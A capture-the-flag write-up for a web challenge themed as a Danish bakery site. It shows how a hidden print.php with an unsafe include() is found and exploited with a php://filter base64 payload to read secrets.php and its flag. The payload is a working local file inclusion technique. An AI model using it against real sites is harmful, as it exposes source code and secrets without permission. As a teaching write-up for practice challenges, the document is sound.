# Brunsviger Huset

```
Difficulty: Easy-Medium
Author: ha1fdan

Welcome to "Brunsviger Huset" (House of Brunsviger), the oldest Danish bakery in town! Our bakers have been perfecting their craft for over 150 years, and our signature brunsviger is a favorite among locals and tourists alike. But, it seems like our bakery has a secret ingredient that's not on the menu...

Can you find the hidden flag that's been baked into our website? Be warned, our bakers are notorious for their clever hiding spots!
```

Reading the code in DevTools, there is a `print.php`:

```javascript
function printCalendar() {
    // Open the print URL in a new window (Note to self: Remember to add print.php to robots.txt!)
    const printUrl = 'print.php?file=/var/www/html/bakery-calendar.php&start=2025-07&end=2025-09';
    const printWindow = window.open(printUrl, '_blank', 'width=800,height=600,toolbar=no,menubar=no,scrollbars=yes');
    
    // Wait for the page to load, then trigger print
    if (printWindow) {
        printWindow.onload = function() {
            setTimeout(function() {
                printWindow.print();
                // Close the window after printing (optional)
                setTimeout(function() {
                    printWindow.close();
                }, 1000);
            }, 1000);
        };
    }
}
```

That seems to invoke other php files. The `robots.txt` contains:

```
User-agent: *
Allow: /index.php
Allow: /bakery-calendar.php
Disallow: /print.php
Disallow: /secrets.php
```

So we want to print the contents of `secret.php`. Pass something not a file:

```shell
$ curl https://brunsviger-huset-0b3fd2b7579b45c0.challs.brunnerne.xyz/print.php?file=/
<br />
<b>Warning</b>:  include(/): Failed to open stream: Not a directory in <b>/var/www/html/print.php</b> on line <b>6</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/print.php</b> on line <b>6</b><br />
```

So that `include()` is used in the php code. Through <https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/>, we know that we can read the content of secrets.php via:

```
https://brunsviger-huset-0b3fd2b7579b45c0.challs.brunnerne.xyz/print.php?file=php://filter/convert.base64-encode/resource=secrets.php
```

Then the base64 encoded file is shown:

```
PD9waHAKLy8gS2VlcCB0aGlzIGZpbGUgc2VjcmV0LCBpdCBjb250YWlucyBzZW5zaXRpdmUgaW5mb3JtYXRpb24uCiRmbGFnID0gImJydW5uZXJ7bDBjNGxfZjFsM18xbmNsdXMxMG5fMW5fdGgzX2I0azNyeX0iOwo/Pgo=
```

Decoded php:

```
<?php
// Keep this file secret, it contains sensitive information.
$flag = "brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}";
?>
```
